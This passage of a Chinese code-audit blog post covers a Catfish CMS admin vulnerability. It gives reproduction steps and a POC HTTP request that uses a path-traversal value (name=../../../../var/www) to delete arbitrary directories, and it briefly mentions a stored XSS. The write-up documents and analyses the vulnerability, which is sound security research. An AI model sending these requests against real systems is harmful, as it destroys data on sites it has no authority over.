+<p>这里实际上就是闭合了前面的 <code>&lt;textarea&gt;</code> ，然后直接执行</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先建立一个无用的文件夹，只要是有权限的地方都可以，比如 <code>bbc</code></p>
+<p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210726230109.png"></p>
+<p>然后发包</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php/admin/Index/deltheme</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.catfish5912.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>63</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://www.catfish5912.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://www.catfish5912.com/index.php/admin/Index/themes.html</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=1ikft0um3chlrqivc5p83a4fa1; think_var=zh-cn; XDEBUG_SESSION=PHPSTORM</span><br><span class="line"></span><br><span class="line">name=../../../bbc&amp;verification=f7d7f36b00b4d8154053e82f4e2579f3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210726230302.png"></p>
+<p>发现文件夹已经被删除</p>
+<p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210726230333.png"></p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php/admin/Index/deltheme HTTP/<span class="number">1.1</span></span><br><span class="line">Host: www.catfish5912.com</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">89.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">89.0</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span></span><br><span class="line"><span class="comment">X-Requested-With: XMLHttpRequest</span></span><br><span class="line"><span class="comment">Content-Length: 59</span></span><br><span class="line"><span class="comment">Origin: http://www.catfish5912.com</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://www.catfish5912.com/index.php/admin/Index/themes.html</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=1ikft0um3chlrqivc5p83a4fa1; think_var=zh-cn; XDEBUG_SESSION=PHPSTORM</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">name=../../../../var/www&amp;verification=f7d7f36b00b4d8154053e82f4e2579f3</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个任意文件夹删除的漏洞还是能造成比较大的危害的，不过毕竟不是前台的，还是有些欠缺。<code>xss</code> 比较意外，其实是 <code>burp</code> 自己扫的，偶然看到了，说有个 <code>dom xss</code> ，于是测了，发现是个存储型的 </p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/07/26/Catfish-CMS%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CNVD-2021-42363%EF%BC%89/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2021-07-26 22:08:45
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                        <b>#</b> 代码审计
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/php/" title="php">
+                        <b>#</b> php
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/catfish-cms/" title="catfish cms">
+                        <b>#</b> catfish cms
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" title="文件删除">
+                        <b>#</b> 文件删除
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-text">漏洞描述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-text">影响范围</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%BB%86%E8%8A%82"><span class="toc-text">漏洞细节</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%A4%E5%A4%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4"><span class="toc-text">两处任意文件删除</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-xss"><span class="toc-text">存储型 xss</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+
+  <div id="vcomments"></div>
+
+  <script>
+    new Valine({
+      el: '#vcomments',
+      appId: 'NDNgppjVEEzr7sUejJFVueds-gzGzoHsz',
+      appKey: 'E6rBuy0l5xXiIjq6GA24XI5J',
+      placeholder: 'Welcome!',
+      avatar: 'retro',
+      lang: 'en'
+    })
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/N0puple/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/N0puple/">Copyright © N0puple 2020</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+    </div>
+  </body>
+</html>
